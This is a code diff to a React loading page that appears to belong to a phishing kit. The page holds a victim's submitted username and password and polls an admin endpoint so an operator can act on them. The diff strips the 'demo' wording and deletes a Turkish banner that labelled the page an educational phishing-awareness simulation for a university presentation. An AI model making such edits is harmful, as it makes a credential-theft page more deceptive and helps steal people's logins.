@@ -11,15 +11,9 @@ const LoadingPage = () => {
   const [progress, setProgress] = useState(0);
   const credentials = location.state || { username: '', password: '' };
 
-  // Set up WebSocket connection to listen for admin commands
+  // Set up polling to listen for admin commands
   useEffect(() => {
-    // This is a mock websocket - in a real app, you'd use a real WebSocket
-    const mockWebSocket = {
-      onmessage: null,
-      close: () => {}
-    };
-
-    // For the demo, we'll use polling instead of WebSockets
+    // For the demo, we'll use polling
     const checkAdminActions = setInterval(() => {
       // Mock API fetch to check for admin actions
       fetch('/api/check-admin-action?username=' + credentials.username)
@@ -37,7 +31,7 @@ const LoadingPage = () => {
           }
         })
         .catch(err => {
-          console.error("Demo error checking admin actions:", err);
+          console.error("Error checking admin actions:", err);
         });
     }, 3000); // Check every 3 seconds
 
@@ -52,7 +46,6 @@ const LoadingPage = () => {
     }, 1000);
 
     return () => {
-      mockWebSocket.close();
       clearInterval(checkAdminActions);
       clearInterval(progressInterval);
     };
@@ -68,12 +61,6 @@ const LoadingPage = () => {
         <div className="w-full mb-6">
           <Progress value={progress} className="h-2 bg-[#32353c]" />
           <p className="text-xs text-white/50 mt-1 text-right">{progress}%</p>
-        </div>
-        
-        <div className="bg-red-500/20 border border-red-500/40 p-3 rounded mt-6">
-          <p className="text-xs text-white/90">
-            <span className="font-bold">Eğitim Amaçlı Simülasyon:</span> Bu sayfa, bir üniversite sunumu için phishing farkındalığı oluşturmak amacıyla tasarlanmıştır.
-          </p>
         </div>
       </div>
     </div>
